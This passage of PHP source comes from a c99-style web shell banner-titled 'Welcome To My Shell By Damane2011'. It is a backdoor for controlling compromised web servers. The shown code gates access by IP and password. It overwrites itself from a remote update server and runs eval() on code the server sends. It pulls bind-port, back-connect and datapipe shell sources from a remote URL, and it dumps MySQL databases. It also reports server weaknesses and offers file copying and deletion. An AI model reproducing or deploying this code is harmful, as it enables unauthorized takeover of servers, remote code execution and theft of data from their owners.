foreach ($host_allow as $k=>$v) { $tmp[] = str_replace("\\*",".*",preg_quote($v)); }
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {
  exit("<a href=\"$sh_mainurl\">$sh_name</a>: Access Denied - Your host (".getenv("REMOTE_ADDR").") not allowed");
}
if (!empty($login)) {
  if (empty($md5_pass)) {$md5_pass = md5($pass);}
  if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass)) {
    header("WWW-Authenticate: Basic realm=\"".$sh_name.": ".$login_txt."\"");
    header("HTTP/1.0 401 Unauthorized");
    exit($accessdeniedmess);
  }
}
if ($act != "img") {
  $lastdir = realpath(".");
  chdir($curdir);
  if ($selfwrite or $updatenow) {
    @ob_clean();
    c99sh_getupdate($selfwrite,1);
    exit;
  }
  $sess_data = unserialize($_COOKIE["$sess_cookie"]);
  if (!is_array($sess_data)) {$sess_data = array();}
  if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}
  if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}
  if (!function_exists("c99getsource")) {
    function c99getsource($fn) {
      global $c99sh_sourcesurl;
      $array = array(
        "c99sh_bindport.pl" => "c99sh_bindport_pl.txt",
        "c99sh_bindport.c" => "c99sh_bindport_c.txt",
        "c99sh_backconn.pl" => "c99sh_backconn_pl.txt",
        "c99sh_backconn.c" => "c99sh_backconn_c.txt",
        "c99sh_datapipe.pl" => "c99sh_datapipe_pl.txt",
        "c99sh_datapipe.c" => "c99sh_datapipe_c.txt",
      );
      $name = $array[$fn];
      if ($name) {return file_get_contents($c99sh_sourcesurl.$name);}
      else {return FALSE;}
    }
  }
  if (!function_exists("c99sh_getupdate")) {
    function c99sh_getupdate($update = TRUE) {
      $url = $GLOBALS["c99sh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["sh_ver"]))."&updatenow=".($updatenow?"1":"0");
      $data = @file_get_contents($url);
      if (!$data) {return "Can't connect to update-server!";}
      else {
        $data = ltrim($data);
        $string = substr($data,3,ord($data{2}));
        if ($data{0} == "\x99" and $data{1} == "\x01") {return "Error: ".$string; return FALSE;}
        if ($data{0} == "\x99" and $data{1} == "\x02") {return "You are using latest version!";}
        if ($data{0} == "\x99" and $data{1} == "\x03") {
          $string = explode("|",$string);
          if ($update) {
            $confvars = array();
            $sourceurl = $string[0];
            $source = file_get_contents($sourceurl);
            if (!$source) {return "Can't fetch update!";}
            else {
              $fp = fopen(__FILE__,"w");
              if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download fx29shell.php manually <a href=\"".$sourceurl."\"><u>here</u></a>.";}
              else {
                fwrite($fp,$source);
                fclose($fp);
                return "Thanks! Update completed.";
              }
            }
          }
          else {return "New version are available: ".$string[1];}
        }
        elseif ($data{0} == "\x99" and $data{1} == "\x04") {
          eval($string);
          return 1;
        }
        else {return "Error in protocol: segmentation failed! (".$data.") ";}
      }
    }
  }
  if (!function_exists("c99_buff_prepare")) {
    function c99_buff_prepare() {
      global $sess_data;
      global $act;
      foreach($sess_data["copy"] as $k=>$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
      foreach($sess_data["cut"] as $k=>$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
      $sess_data["copy"] = array_unique($sess_data["copy"]);
      $sess_data["cut"] = array_unique($sess_data["cut"]);
      sort($sess_data["copy"]);
      sort($sess_data["cut"]);
      if ($act != "copy") {foreach($sess_data["cut"] as $k=>$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
      else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
    }
  }
  c99_buff_prepare();
  if (!function_exists("c99_sess_put")) {
    function c99_sess_put($data) {
      global $sess_cookie;
      global $sess_data;
      c99_buff_prepare();
      $sess_data = $data;
      $data = serialize($data);
      setcookie($sess_cookie,$data);
    }
  }
  foreach (array("sort","sql_sort") as $v) {
    if (!empty($_GET[$v])) {$$v = $_GET[$v];}
    if (!empty($_POST[$v])) {$$v = $_POST[$v];}
  }
  if ($sort_save) {
    if (!empty($sort)) {setcookie("sort",$sort);}
    if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}
  }
  if (!function_exists("str2mini")) {
    function str2mini($content,$len) {
      if (strlen($content) > $len) {
        $len = ceil($len/2) - 2;
        return substr($content, 0,$len)."...".substr($content,-$len);
      } else {return $content;}
    }
  }
  if (!function_exists("view_size")) {
    function view_size($size) {
      if (!is_numeric($size)) { return FALSE; }
      else {
        if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
        elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
        elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
        else {$size = $size . " B";}
        return $size;
      }
    }
  }
  if (!function_exists("fs_copy_dir")) {
    function fs_copy_dir($d,$t) {
      $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
      if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
      $h = opendir($d);
      while (($o = readdir($h)) !== FALSE) {
        if (($o != ".") and ($o != "..")) {
          if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
          else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
          if (!$ret) {return $ret;}
        }
      }
      closedir($h);
      return TRUE;
    }
  }
  if (!function_exists("fs_copy_obj")) {
    function fs_copy_obj($d,$t) {
      $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
      $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
      if (!is_dir(dirname($t))) {mkdir(dirname($t));}
      if (is_dir($d)) {
        if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
        if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
        return fs_copy_dir($d,$t);
      }
      elseif (is_file($d)) { return copy($d,$t); }
      else { return FALSE; }
    }
  }
  if (!function_exists("fs_move_dir")) {
    function fs_move_dir($d,$t) {
      $h = opendir($d);
      if (!is_dir($t)) {mkdir($t);}
      while (($o = readdir($h)) !== FALSE) {
        if (($o != ".") and ($o != "..")) {
          $ret = TRUE;
          if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
          else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}
          if (!$ret) {return $ret;}
        }
      }
      closedir($h);
      return TRUE;
    }
  }
  if (!function_exists("fs_move_obj")) {
    function fs_move_obj($d,$t) {
      $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
      $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
      if (is_dir($d)) {
        if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
        if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
        return fs_move_dir($d,$t);
      }
      elseif (is_file($d)) {
        if(copy($d,$t)) {return unlink($d);}
        else {unlink($t); return FALSE;}
      }
      else {return FALSE;}
    }
  }
  if (!function_exists("fs_rmdir")) {
    function fs_rmdir($d) {
      $h = opendir($d);
      while (($o = readdir($h)) !== FALSE) {
        if (($o != ".") and ($o != "..")) {
          if (!is_dir($d.$o)) {unlink($d.$o);}
          else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
        }
      }
      closedir($h);
      rmdir($d);
      return !is_dir($d);
    }
  }
  if (!function_exists("fs_rmobj")) {
    function fs_rmobj($o) {
      $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
      if (is_dir($o)) {
        if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
        return fs_rmdir($o);
      }
      elseif (is_file($o)) {return unlink($o);}
      else {return FALSE;}
    }
  }
  if (!function_exists("tabsort")) {
    function tabsort($a,$b) {global $v; return strnatcmp($a[$v], $b[$v]);}
  }
  if (!function_exists("view_perms")) {
    function view_perms($mode) {
      if (($mode & 0xC000) === 0xC000) {$type = "s";}
      elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
      elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
      elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
      elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
      elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
      elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
      else {$type = "?";}
      $owner["read"] = ($mode & 00400)?"r":"-";
      $owner["write"] = ($mode & 00200)?"w":"-";
      $owner["execute"] = ($mode & 00100)?"x":"-";
      $group["read"] = ($mode & 00040)?"r":"-";
      $group["write"] = ($mode & 00020)?"w":"-";
      $group["execute"] = ($mode & 00010)?"x":"-";
      $world["read"] = ($mode & 00004)?"r":"-";
      $world["write"] = ($mode & 00002)? "w":"-";
      $world["execute"] = ($mode & 00001)?"x":"-";
      if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
      if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
      if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}
      return $type.join("",$owner).join("",$group).join("",$world);
    }
  }
  if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}}
  if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}}
  if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}}
  if (!function_exists("parse_perms")) {
    function parse_perms($mode) {
      if (($mode & 0xC000) === 0xC000) {$t = "s";}
      elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
      elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
      elseif (($mode & 0x8000) === 0x8000) {$t = "-";}
      elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
      elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
      elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
      else {$t = "?";}
      $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;
      $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;
      $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;
      return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);
    }
  }
  if (!function_exists("parsesort")) {
    function parsesort($sort) {
      $one = intval($sort);
      $second = substr($sort,-1);
      if ($second != "d") {$second = "a";}
      return array($one,$second);
    }
  }
  if (!function_exists("view_perms_color")) {
    function view_perms_color($o) {
      if (!is_readable($o)) {return "<font color=red>".view_perms(fileperms($o))."</font>";}
      elseif (!is_writable($o)) {return "<font color=white>".view_perms(fileperms($o))."</font>";}
      else {return "<font color=green>".view_perms(fileperms($o))."</font>";}
    }
  }
  if (!function_exists("mysql_dump")) {
    function mysql_dump($set) {
      global $sh_ver;
      $sock = $set["sock"];
      $db = $set["db"];
      $print = $set["print"];
      $nl2br = $set["nl2br"];
      $file = $set["file"];
      $add_drop = $set["add_drop"];
      $tabs = $set["tabs"];
      $onlytabs = $set["onlytabs"];
      $ret = array();
      $ret["err"] = array();
      if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
      if (empty($db)) {$db = "db";}
      if (empty($print)) {$print = 0;}
      if (empty($nl2br)) {$nl2br = 0;}
      if (empty($add_drop)) {$add_drop = TRUE;}
      if (empty($file)) {
        $file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
      }
      if (!is_array($tabs)) {$tabs = array();}
      if (empty($add_drop)) {$add_drop = TRUE;}
      if (sizeof($tabs) == 0) {
        //Retrieve tables-list
        $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
        if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
      }
      $out = "
      # Dumped by ".$sh_name."
      #
      # Host settings:
      # MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
      # Date: ".date("d.m.Y H:i:s")."
      # DB: \"".$db."\"
      #---------------------------------------------------------";
      $c = count($onlytabs);
      foreach($tabs as $tab) {
        if ((in_array($tab,$onlytabs)) or (!$c)) {
          if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
          //Receieve query for create table structure
          $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
          if (!$res) {$ret["err"][] = mysql_smarterror();}
          else {
            $row = mysql_fetch_row($res);
            $out .= $row["1"].";\n\n";
            //Receieve table variables
            $res = mysql_query("SELECT * FROM `$tab`", $sock);
            if (mysql_num_rows($res) > 0) {
              while ($row = mysql_fetch_assoc($res)) {
                $keys = implode("`, `", array_keys($row));
                $values = array_values($row);
                foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
                $values = implode("', '", $values);
                $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
                $out .= $sql;
              }
            }
          }
        }
      }
      $out .= "#---------------------------------------------------------------------------------\n\n";
      if ($file) {
        $fp = fopen($file, "w");
        if (!$fp) {$ret["err"][] = 2;}
        else {
          fwrite ($fp, $out);
          fclose ($fp);
        }
      }
      if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
      return $out;
    }
  }
  if (!function_exists("mysql_buildwhere")) {
    function mysql_buildwhere($array,$sep=" and",$functs=array()) {
      if (!is_array($array)) {$array = array();}
      $result = "";
      foreach($array as $k=>$v) {
        $value = "";
        if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
        $value .= "'".addslashes($v)."'";
        if (!empty($functs[$k])) {$value .= ")";}
        $result .= "`".$k."` = ".$value.$sep;
      }
      $result = substr($result,0,strlen($result)-strlen($sep));
      return $result;
    }
  }
  if (!function_exists("mysql_fetch_all")) {
    function mysql_fetch_all($query,$sock) {
      if ($sock) {$result = mysql_query($query,$sock);}
      else {$result = mysql_query($query);}
      $array = array();
      while ($row = mysql_fetch_array($result)) {$array[] = $row;}
      mysql_free_result($result);
      return $array;
    }
  }
  if (!function_exists("mysql_smarterror")) {
    function mysql_smarterror($type,$sock) {
      if ($sock) {$error = mysql_error($sock);}
      else {$error = mysql_error();}
      $error = htmlspecialchars($error);
      return $error;
    }
  }
  if (!function_exists("mysql_query_form")) {
    function mysql_query_form() {
      global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
      if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
      if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
      if ((!$submit) or ($sql_act)) {
        echo "<table border=0><tr><td><form name=\"c99sh_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\"> <input type=submit value=\"No\"></form></td>";
        if ($tbl_struct) {
          echo "<td valign=\"top\"><b>Fields:</b><br>";
          foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ <a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
          echo "</td></tr></table>";
        }
      }
      if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
    }
  }
  if (!function_exists("mysql_create_db")) {
    function mysql_create_db($db,$sock="") {
      $sql = "CREATE DATABASE `".addslashes($db)."`;";
      if ($sock) {return mysql_query($sql,$sock);}
      else {return mysql_query($sql);}
    }
  }
  if (!function_exists("mysql_query_parse")) {
    function mysql_query_parse($query) {
      $query = trim($query);
      $arr = explode (" ",$query);
      $types = array(
        "SELECT"=>array(3,1),
        "SHOW"=>array(2,1),
        "DELETE"=>array(1),
        "DROP"=>array(1)
      );
      $result = array();
      $op = strtoupper($arr[0]);
      if (is_array($types[$op])) {
        $result["propertions"] = $types[$op];
        $result["query"]  = $query;
        if ($types[$op] == 2) {
          foreach($arr as $k=>$v) {
            if (strtoupper($v) == "LIMIT") {
              $result["limit"] = $arr[$k+1];
              $result["limit"] = explode(",",$result["limit"]);
              if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
              unset($arr[$k],$arr[$k+1]);
            }
          }
        }
      }
      else {return FALSE;}
    }
  }
  if (!function_exists("c99fsearch")) {
    function c99fsearch($d) {
      global $found;
      global $found_d;
      global $found_f;
      global $search_i_f;
      global $search_i_d;
      global $a;
      if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
      $h = opendir($d);
      while (($f = readdir($h)) !== FALSE) {
        if($f != "." && $f != "..") {
          $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));
          if (is_dir($d.$f)) {
            $search_i_d++;
            if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
            if (!is_link($d.$f)) {c99fsearch($d.$f);}
          }
          else {
            $search_i_f++;
            if ($bool) {
              if (!empty($a["text"])) {
                $r = @file_get_contents($d.$f);
                if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
                if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
                if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
                else {$bool = strpos(" ".$r,$a["text"],1);}
                if ($a["text_not"]) {$bool = !$bool;}
                if ($bool) {$found[] = $d.$f; $found_f++;}
              }
              else {$found[] = $d.$f; $found_f++;}
            }
          }
        }
      }
      closedir($h);
    }
  }
  if ($act == "gofile") {
    if (is_dir($f)) { $act = "ls"; $d = $f; }
    else { $act = "f"; $d = dirname($f); $f = basename($f); }
  }
  //Sending Headers
  @ob_start();
  @ob_implicit_flush(0);
  function onphpshutdown() {
    global $gzipencode,$ft;
    if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad"))) {
      $v = @ob_get_contents();
      @ob_end_clean();
      @ob_start("ob_gzHandler");
      echo $v;
      @ob_end_flush();
    }
  }
  function c99shexit() {
    onphpshutdown();
    exit;
  }
  header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
  header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
  header("Cache-Control: no-store, no-cache, must-revalidate");
  header("Cache-Control: post-check=0, pre-check=0", FALSE);
  header("Pragma: no-cache");
  //Setting Temporary Dir
  if (empty($tmpdir)) {
    $tmpdir = ini_get("upload_tmp_dir");
    if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}
  }
  $tmpdir = realpath($tmpdir);
  $tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);
  if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
  if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
  else {$tmpdir_logs = realpath($tmpdir_logs);}
  //Getting Status
  function showstat($stat) {
    if ($stat=="on") { return "<font color=#00FF00><b>ON</b></font>"; }
    else { return "<font color=#FF9900><b>OFF</b></font>"; }
  }
  function testperl() {
    if (ex('perl -h')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testfetch() {
    if(ex('fetch --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testwget() {
    if (ex('wget --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testoracle() {
    if (function_exists('ocilogon')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testpostgresql() {
    if (function_exists('pg_connect')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testmssql() {
    if (function_exists('mssql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testcurl() {
    if (function_exists('curl_version')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testmysql() {
    if (function_exists('mysql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<font color=#FF9900><b>".$disablefunc."</b></font>"; }
    else { return "<font color=#00FF00><b>NONE</b></b></font>"; }
  }
  //Getting Safe Mode Status
  if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
    $safemode = TRUE;
    $hsafemode = "<font color=#3366FF><b>SAFE MODE is ON (Secure)</b></font>";
  }
  else {
    $safemode = FALSE;
    $hsafemode = "<font color=#FF9900><b>SAFE MODE is OFF (Not Secure)</b></font>";
  }
  $v = @ini_get("open_basedir");
  if ($v or strtolower($v) == "on") {
    $openbasedir = TRUE;
    $hopenbasedir = "<font color=red>".$v."</font>";
  }
  else {
    $openbasedir = FALSE;
    $hopenbasedir = "<font color=green>OFF (not secure)</font>";
  }
  $sort = htmlspecialchars($sort);
  if (empty($sort)) {$sort = $sort_default;}
  $sort[1] = strtolower($sort[1]);
  $DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
  if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
  $DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$surl."act=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE));
  @ini_set("highlight.bg",$highlight_bg);
  @ini_set("highlight.comment",$highlight_comment);
  @ini_set("highlight.default",$highlight_default);
  @ini_set("highlight.html",$highlight_html);
  @ini_set("highlight.keyword",$highlight_keyword);
  @ini_set("highlight.string",$highlight_string);
  if (!is_array($actbox)) { $actbox = array(); }
  $dspact = $act = htmlspecialchars($act);
  $disp_fullpath = $ls_arr = $notls = null;
  $ud = urlencode($d);
  //Directory
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  if (empty($d)) {$d = realpath(".");}
  elseif(realpath($d)) {$d = realpath($d);}
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  $d = str_replace("\\\\","\\",$d);
  $dispd = htmlspecialchars($d);
/***** HTML START *****/
echo $html_start;
echo "<div class=barheader2><h3>$sh_name</h3>.: Welcome To My Shell By Damane2011 :.</div>\n";
echo "<table id=pagebar><tr><td width=50%><p>".
     "Software : ".$DISP_SERVER_SOFTWARE ." - <a href=".$surl."act=phpini>php.ini</a><br>".
     "$hsafemode<br>";
echo "OS : ".php_uname()."<br>";
echo "</p></td>".
     "<td width=50%><p>Server IP : <a href=http://whois.domaintools.com/".gethostbyname($_SERVER["HTTP_HOST"]).">".gethostbyname($_SERVER["HTTP_HOST"])."</a> - ".
     "Your IP : <a href=http://whois.domaintools.com/".$_SERVER["REMOTE_ADDR"].">".$_SERVER["REMOTE_ADDR"]."</a><br>";
if($win){echo "Drives : ".disp_drives($d,$surl)."<br>";}
if (!$win) { echo "User ID : ".myshellexec("id")."<br>";}
else { echo "User : " . get_current_user()."<br>";}
echo "Freespace : ".disp_freespace($d);


echo "<tr><td colspan=2><p>";
echo "MySQL: ".testmysql()." MSSQL: ".testmssql()." Oracle: ".testoracle()." MSSQL: ".testmssql()." PostgreSQL: ".testpostgresql().
     " cURL: ".testcurl()." WGet: ".testwget()." Fetch: ".testfetch()." Perl: ".testperl()."<br>";
echo "Disabled Functions: ".showdisablefunctions();
echo "</p></td></tr>";
echo "<tr><td colspan=2 id=mainmenu>";
if (count($quicklaunch2) > 0) {
  foreach($quicklaunch2 as $item) {
    $item[1] = str_replace("%d",urlencode($d),$item[1]);
    $item[1] = str_replace("%sort",$sort,$item[1]);
    $v = realpath($d."..");
    if (empty($v)) {
      $a = explode(DIRECTORY_SEPARATOR,$d);
      unset($a[count($a)-2]);
      $v = join(DIRECTORY_SEPARATOR,$a);
    }
    $item[1] = str_replace("%upd",urlencode($v),$item[1]);
    echo "<a href=\"".$item[1]."\">".$item[0]."</a>\n";
  }
}
echo "</td><tr><td colspan=2 id=mainmenu>";
if (count($quicklaunch1) > 0) {
  foreach($quicklaunch1 as $item) {
    $item[1] = str_replace("%d",urlencode($d),$item[1]);
    $item[1] = str_replace("%sort",$sort,$item[1]);
    $v = realpath($d."..");
    if (empty($v)) {
      $a = explode(DIRECTORY_SEPARATOR,$d);
      unset($a[count($a)-2]);
      $v = join(DIRECTORY_SEPARATOR,$a);
    }
    $item[1] = str_replace("%upd",urlencode($v),$item[1]);
    echo "<a href=\"".$item[1]."\">".$item[0]."</a>\n";
  }
}
echo "</td></tr><tr><td colspan=2>";
echo "<p class=fleft>";
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pd as $b) {
  $t = ""; $j = 0;
  foreach ($e as $r) {
    $t.= $r.DIRECTORY_SEPARATOR;
    if ($j == $i) { break; }
    $j++;
  }
  echo "<a href=\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\"><font color=yellow>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</font></a>";
  $i++;
}
echo " - ";
if (is_writable($d)) {
  $wd = TRUE;
  $wdt = "<font color=#00FF00>[OK]</font>";
  echo "<b><font color=green>".view_perms(fileperms($d))."</font></b>";
}
else {
  $wd = FALSE;
  $wdt = "<font color=red>[Read-Only]</font>";
  echo "<b>".view_perms_color($d)."</b>";
}
?>
</p>
<div class=fright>
<form method="POST"><input type=hidden name=act value="ls">
Directory: <input type="text" name="d" size="50" value="<?php echo $dispd; ?>"> <input type=submit value="Go">
</form>
</div>
</td></tr></table>
<?php
//Information Table
echo "<table id=maininfo><tr><td width=\"100%\">\n";
//Action
if ($act == "") { $act = $dspact = "ls"; }
if ($act == "phpini" ) { get_phpini(); }
if ($act == "sql") {
  $sql_surl = $surl."act=sql";
  if ($sql_login)  {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}
  if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}
  if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
  if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
  if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
  $sql_surl .= "&";
  echo "<h4>Attention! SQL-Manager is <u>NOT</u> a ready module! Don't reports bugs.</h4>".
       "<table>".
       "<tr><td width=\"100%\" colspan=2 class=barheader>";
  if ($sql_server) {
    $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
    $err = mysql_smarterror();
    @mysql_select_db($sql_db,$sql_sock);
    if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
  }
  else {$sql_sock = FALSE;}
  echo ".: SQL Manager :.<br>";
  if (!$sql_sock) {
    if (!$sql_server) {echo "NO CONNECTION";}
    else {echo "Can't connect! ".$err;}
  }
  else {
    $sqlquicklaunch = array();
    $sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
    $sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));
    $sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");
    $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
    $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
    $sqlquicklaunch[] = array("Logout",$surl."act=sql");
    echo "MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")<br>";
